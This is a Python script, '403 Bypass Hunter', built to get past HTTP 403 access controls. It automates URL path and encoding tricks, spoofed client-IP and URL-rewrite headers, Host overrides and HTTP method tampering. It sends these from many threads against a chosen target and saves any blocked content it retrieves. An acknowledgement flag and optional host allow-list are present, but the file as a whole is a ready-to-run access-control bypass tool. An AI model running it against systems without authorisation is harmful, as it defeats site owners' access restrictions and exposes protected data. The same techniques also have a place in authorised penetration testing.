#!/usr/bin/env python3
"""
403 Bypass Hunter v1.0
When you get 403, the file EXISTS but is blocked!

Techniques:
1. URL Manipulation (Parser Confusion)
2. Header Spoofing (X-Forwarded-For, X-Original-URL)
3. Method Tampering (POST, HEAD, TRACE)
4. Path Traversal Variants
5. Encoding Tricks

Author: Security Research Team
"""

import requests
import sys
import os
import time
import json
import uuid
from urllib.parse import urlparse, quote
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
urllib3.disable_warnings()


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    END = "\033[0m"


@dataclass
class BypassConfig:
    timeout: int = 15
    delay: float = 0.0
    verbose: bool = False
    output_dir: str = "."
    save_successful: bool = True
    threads: int = 10
    retries: int = 2
    backoff_factor: float = 0.3
    verify_ssl: bool = False
    require_ack: bool = True
    allowed_hosts: List[str] = field(default_factory=list)
    allowed_suffixes: List[str] = field(default_factory=list)


class Bypass403:
    def __init__(self, url: str, config: BypassConfig = None):
        self.original_url = url
        self.config = config or BypassConfig()
        self.parsed = urlparse(url)
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.path = self.parsed.path
        self.allowed_hosts = {h.lower() for h in self.config.allowed_hosts}
        self.allowed_suffixes = {
            s.lower() if s.startswith(".") else f".{s.lower()}"
            for s in self.config.allowed_suffixes
        }
        self.session = self._build_session()
        self.request_count = 0
        self.run_id = str(uuid.uuid4())

        self.results = []
        self.successful_bypasses = []

    def log(self, level: str, msg: str):
        colors = {
            'info': Colors.BLUE,
            'success': Colors.GREEN,
            'warning': Colors.YELLOW,
            'critical': Colors.RED,
            'bypass': Colors.PURPLE,
        }
        color = colors.get(level, '')
        print(f"{color}[{level.upper()}]{Colors.END} {msg}")

    def _build_session(self):
        session = requests.Session()
        retry = Retry(
            total=self.config.retries,
            backoff_factor=self.config.backoff_factor,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "HEAD", "OPTIONS"],
        )
        adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=10)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.verify = self.config.verify_ssl
        return session

    def _is_allowed_url(self, url: str) -> bool:
        if not self.allowed_hosts and not self.allowed_suffixes:
            return True
        host = (urlparse(url).hostname or "").lower()
        if host in self.allowed_hosts:
            return True
        return any(host.endswith(suffix) for suffix in self.allowed_suffixes)

    def _request(self, method: str, url: str, **kwargs):
        if not self._is_allowed_url(url):
            if self.config.verbose:
                self.log('warning', f"Blocked by scope: {url}")
            return None
        kwargs.setdefault("timeout", self.config.timeout)
        try:
            resp = self.session.request(method=method, url=url, **kwargs)
            self.request_count += 1
            return resp
        except Exception as e:
            if self.config.verbose:
                self.log('warning', f"Request error: {e}")
            return None

    # ==================== URL MANIPULATION ====================

    def get_url_variants(self) -> List[Dict]:
        """Generate URL manipulation variants"""
        path = self.path
        variants = []

        # 1. Basic path manipulations
        basic_variants = [
            path + "/",
            path + "//",
            path + "/.",
            path + "/./",
            path + "/..",
            "/" + path.lstrip("/"),
            "//" + path.lstrip("/"),
            "/./" + path.lstrip("/"),
            "/%2e/" + path.lstrip("/"),
            path.replace("/", "//"),
            path.replace("/", "/./"),
        ]

        for v in basic_variants:
            variants.append({'type': 'path_manipulation', 'url': self.base_url + v})

        # 2. Encoding tricks
        encoding_variants = [
            path + "%20",           # Space
            path + "%09",           # Tab
            path + "%00",           # Null byte
            path + "%0d%0a",        # CRLF
            path + "?",             # Query string
            path + "??",
            path + "#",             # Fragment
            path + ";",             # Semicolon
            path + ".json",         # Extension
            path + ".html",
            path + "..;/",
        ]

        for v in encoding_variants:
            variants.append({'type': 'encoding', 'url': self.base_url + v})

        # 3. URL encoding of path separators
        encoded_path = path.replace("/", "%2f")
        variants.append({'type': 'url_encode', 'url': self.base_url + "/" + encoded_path.lstrip("%2f")})

        # Double encoding
        double_encoded = path.replace("/", "%252f")
        variants.append({'type': 'double_encode', 'url': self.base_url + "/" + double_encoded.lstrip("%252f")})

        # 4. Case manipulation
        variants.append({'type': 'uppercase', 'url': self.base_url + path.upper()})
        variants.append({'type': 'mixed_case', 'url': self.base_url + ''.join(
            c.upper() if i % 2 else c for i, c in enumerate(path)
        )})

        # 5. Unicode normalization tricks
        unicode_variants = [
            path.replace("/", "/\uff0f"),  # Fullwidth slash
            path.replace(".", "\u2024"),   # One dot leader
        ]
        for v in unicode_variants:
            variants.append({'type': 'unicode', 'url': self.base_url + v})

        return variants

    # ==================== HEADER MANIPULATION ====================

    def get_header_variants(self) -> List[Dict]:
        """Generate header-based bypass attempts"""
        variants = []

        # IP Spoofing headers
        ip_headers = [
            'X-Forwarded-For',
            'X-Forwarded-Host',
            'X-Originating-IP',
            'X-Remote-IP',
            'X-Remote-Addr',
            'X-Client-IP',
            'X-Real-IP',
            'X-Host',
            'X-Custom-IP-Authorization',
            'Forwarded',
            'True-Client-IP',
            'CF-Connecting-IP',
            'X-Cluster-Client-IP',
        ]

        ip_values = [
            '127.0.0.1',
            'localhost',
            '127.0.0.1:80',
            '127.0.0.1:443',
            '10.0.0.1',
            '172.16.0.1',
            '192.168.1.1',
            '0.0.0.0',
            '::1',
        ]

        for header in ip_headers:
            for ip in ip_values[:3]:  # Limit to top 3 IPs
                variants.append({
                    'type': 'ip_spoof',
                    'headers': {header: ip},
                    'description': f'{header}: {ip}'
                })

        # X-Original-URL / X-Rewrite-URL technique
        rewrite_headers = [
            'X-Original-URL',
            'X-Rewrite-URL',
            'X-Override-URL',
            'X-Proxy-URL',
            'Redirect',
            'Request-Uri',
        ]

        for header in rewrite_headers:
            variants.append({
                'type': 'url_rewrite',
                'url': self.base_url + '/',  # Request root
                'headers': {header: self.path},
                'description': f'GET / with {header}: {self.path}'
            })

        # Host header manipulation
        variants.append({
            'type': 'host_override',
            'headers': {'Host': 'localhost'},
            'description': 'Host: localhost'
        })
        variants.append({
            'type': 'host_override',
            'headers': {'Host': '127.0.0.1'},
            'description': 'Host: 127.0.0.1'
        })

        # Referer manipulation
        variants.append({
            'type': 'referer',
            'headers': {'Referer': self.base_url + '/admin'},
            'description': 'Referer: /admin'
        })
        variants.append({
            'type': 'referer',
            'headers': {'Referer': self.base_url},
            'description': 'Referer: base_url'
        })

        return variants

    # ==================== METHOD TAMPERING ====================

    def get_method_variants(self) -> List[Dict]:
        """Generate HTTP method tampering variants"""
        methods = [
            'POST',
            'PUT',
            'PATCH',
            'DELETE',
            'HEAD',
            'OPTIONS',
            'TRACE',
            'CONNECT',
            # Non-standard methods (some WAFs don't know them)
            'PROPFIND',
            'MKCOL',
            'COPY',
            'MOVE',
            'LOCK',
            'UNLOCK',
            # Made up methods (WAF might pass, server treats as GET)
            'GETT',
            'GETS',
            'GET/',
        ]

        variants = []
        for method in methods:
            variants.append({
                'type': 'method',
                'method': method,
                'description': f'Method: {method}'
            })

        # Method override headers
        override_headers = [
            'X-HTTP-Method',
            'X-HTTP-Method-Override',
            'X-Method-Override',
        ]

        for header in override_headers:
            variants.append({
                'type': 'method_override',
                'method': 'POST',
                'headers': {header: 'GET'},
                'description': f'POST with {header}: GET'
            })

        return variants

    # ==================== TEST EXECUTION ====================

    def test_variant(self, variant: Dict) -> Optional[Dict]:
        """Test a single bypass variant"""
        try:
            url = variant.get('url', self.original_url)
            method = variant.get('method', 'GET')
            headers = variant.get('headers', {})

            # Add base headers
            base_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
            }
            base_headers.update(headers)

            if self.config.delay > 0:
                time.sleep(self.config.delay)

            resp = self._request(
                method=method,
                url=url,
                headers=base_headers,
                allow_redirects=False
            )

            if not resp:
                return None

            result = {
                'variant': variant,
                'status_code': resp.status_code,
                'content_length': len(resp.content),
                'headers': dict(resp.headers),
            }

            # Check if bypass successful
            if resp.status_code == 200:
                result['success'] = True
                result['content_preview'] = resp.text[:500]
                return result
            elif resp.status_code in [301, 302, 307, 308]:
                result['redirect'] = resp.headers.get('Location', '')
                return result

            return result

        except Exception as e:
            if self.config.verbose:
                self.log('warning', f"Error testing variant: {e}")
            return None

    def run(self) -> Dict:
        """Run all bypass techniques"""
        print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}403 Bypass Hunter v1.0{Colors.END}")
        print(f"{'='*70}")
        print(f"Target: {self.original_url}")
        print(f"{'='*70}\n")

        if self.config.require_ack:
            self.log('critical', 'Safety check not acknowledged. Use --i-understand to proceed.')
            return {'status': 'ack_required'}

        # First, verify we get 403
        self.log('info', 'Checking original URL...')
        try:
            resp = self._request("GET", self.original_url)
            if not resp:
                self.log('critical', 'Cannot reach target')
                return {'status': 'unreachable'}
            original_status = resp.status_code
            self.log('info', f'Original status: {original_status}')

            if original_status == 200:
                self.log('success', 'URL is already accessible (200 OK)')
                return {'status': 'already_accessible'}
            elif original_status == 404:
                self.log('warning', 'URL returns 404 - file does not exist')
                return {'status': 'not_found'}
            elif original_status != 403:
                self.log('warning', f'Unexpected status code: {original_status}')
        except Exception as e:
            self.log('critical', f'Cannot reach target: {e}')
            return {'status': 'unreachable'}

        # Collect all variants
        all_variants = []

        self.log('info', 'Generating URL manipulation variants...')
        url_variants = self.get_url_variants()
        all_variants.extend(url_variants)
        self.log('info', f'  {len(url_variants)} URL variants')

        self.log('info', 'Generating header manipulation variants...')
        header_variants = self.get_header_variants()
        all_variants.extend(header_variants)
        self.log('info', f'  {len(header_variants)} header variants')

        self.log('info', 'Generating method tampering variants...')
        method_variants = self.get_method_variants()
        all_variants.extend(method_variants)
        self.log('info', f'  {len(method_variants)} method variants')

        self.log('info', f'\nTotal variants to test: {len(all_variants)}')
        print()

        # Test all variants
        successful = []

        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = {executor.submit(self.test_variant, v): v for v in all_variants}

            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.results.append(result)

                    if result.get('success'):
                        variant = result['variant']
                        desc = variant.get('description', variant.get('url', variant.get('type', 'unknown')))
                        self.log('bypass', f"SUCCESS! {desc} -> {result['status_code']} ({result['content_length']} bytes)")
                        successful.append(result)
                    elif self.config.verbose:
                        variant = result['variant']
                        self.log('info', f"[{result['status_code']}] {variant.get('type', 'unknown')}")

        # Report
        print(f"\n{Colors.BOLD}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}BYPASS COMPLETE{Colors.END}")
        print(f"{'='*70}")

        print(f"\nTotal tested: {len(self.results)}")
        print(f"{Colors.GREEN}Successful bypasses: {len(successful)}{Colors.END}")

        if successful:
            print(f"\n{Colors.PURPLE}WORKING BYPASSES:{Colors.END}")
            for s in successful:
                variant = s['variant']
                print(f"\n  Type: {variant.get('type')}")
                if 'url' in variant:
                    print(f"  URL: {variant['url']}")
                if 'headers' in variant:
                    print(f"  Headers: {variant['headers']}")
                if 'method' in variant:
                    print(f"  Method: {variant['method']}")
                print(f"  Status: {s['status_code']}")
                print(f"  Size: {s['content_length']} bytes")

                # Save successful content
                if self.config.save_successful and 'content_preview' in s:
                    filename = f"bypass_{urlparse(self.original_url).path.replace('/', '_')}_{datetime.now().strftime('%H%M%S')}.txt"
                    filepath = os.path.join(self.config.output_dir, filename)
                    with open(filepath, 'w', encoding='utf-8') as f:
                        f.write(s.get('content_preview', ''))
                    print(f"  Saved: {filepath}")

        # Save report
        report = {
            'target': self.original_url,
            'original_status': original_status,
            'timestamp': datetime.now().isoformat(),
            'run_id': self.run_id,
            'total_tested': len(self.results),
            'successful': len(successful),
            'bypasses': successful,
            'request_count': self.request_count,
        }

        report_path = os.path.join(
            self.config.output_dir,
            f"bypass_report_{self.parsed.netloc}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        )
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2, default=str)

        print(f"\n{Colors.GREEN}Report saved: {report_path}{Colors.END}")

        return report


def main():
    import argparse

    parser = argparse.ArgumentParser(description='403 Bypass Hunter')
    parser.add_argument('url', help='URL that returns 403')
    parser.add_argument('-o', '--output', default='.', help='Output directory')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Concurrent threads')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout')
    parser.add_argument('--delay', type=float, default=0.0, help='Delay between requests')
    parser.add_argument('--retries', type=int, default=2, help='Retry count')
    parser.add_argument('--backoff', type=float, default=0.3, help='Retry backoff factor')
    parser.add_argument('--verify-ssl', action='store_true', help='Verify TLS certificates')
    parser.add_argument('--allow-host', action='append', default=[], help='Allowed hostnames')
    parser.add_argument('--allow-suffix', action='append', default=[], help='Allowed host suffixes (e.g. .vercel.app)')
    parser.add_argument('--i-understand', action='store_true', help='Acknowledge safety check')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    config = BypassConfig(
        timeout=args.timeout,
        delay=args.delay,
        verbose=args.verbose,
        output_dir=args.output,
        threads=args.threads,
        retries=args.retries,
        backoff_factor=args.backoff,
        verify_ssl=args.verify_ssl,
        allowed_hosts=args.allow_host,
        allowed_suffixes=args.allow_suffix,
        require_ack=not args.i_understand,
    )

    bypasser = Bypass403(args.url, config)
    bypasser.run()


if __name__ == '__main__':
    main()
